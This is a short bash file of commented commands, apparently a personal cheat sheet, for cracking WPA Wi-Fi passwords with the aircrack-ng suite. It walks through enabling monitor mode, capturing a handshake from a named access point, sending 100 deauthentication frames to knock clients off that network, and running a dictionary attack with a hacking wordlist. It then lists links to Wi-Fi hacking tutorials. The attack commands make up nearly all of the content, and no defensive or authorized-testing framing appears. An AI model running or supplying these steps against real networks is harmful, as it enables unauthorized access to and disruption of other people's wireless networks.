#!/bin/bash

# https://www.aircrack-ng.org/doku.php?id=cracking_wpa#aircrack-ng_says_no_valid_wpa_handshakes_found

############################################################
# stop all connection managers (NetworkManager.service)

## new terminal
# sudo airmon-ng start wlp3s0
# sudo airodump-ng wlp3s0mon

## separate terminal
# sudo airodump-ng --bssid 58:7B:E9:07:4C:D0  -c 6 --write WPAcrack wlp3s0mon

## separate terminal
# sudo aireplay-ng --deauth 100 -a 58:7B:E9:07:4C:D0 wlp3s0mon

## separate terminal
# sudo aircrack-ng WPAcrack-01.cap -w  Public/darkc0de.lst
############################################################
## bring back wifi
# sudo airmon-ng stop wlp3s0mon
# sudo iwconfig wlp3s0 mode managed

############
# others:
# http://www.kalitutorials.net/2016/08/hacking-wpawpa-2-without.html
# http://www.hackingdream.net/2014/07/how-to-hack-wifi-wpa-and-wpa2-without.html
# http://www.dailymail.co.uk/sciencetech/article-2331984/Think-strong-password-Hackers-crack-16-character-passwords-hour.html
# https://www.blackmoreops.com/2014/03/27/cracking-wpa-wpa2-with-hashcat-kali-linux/
# https://www.blackmoreops.com/2014/03/10/cracking-wifi-wpawpa2-passwords-using-pyrit-cowpatty/
# http://security.stackexchange.com/questions/35278/bruteforce-on-10-characters-length-wpa2-password
# http://www.slideshare.net/null0x00/cracking-wpawpa2-with-nondictionary-attacks
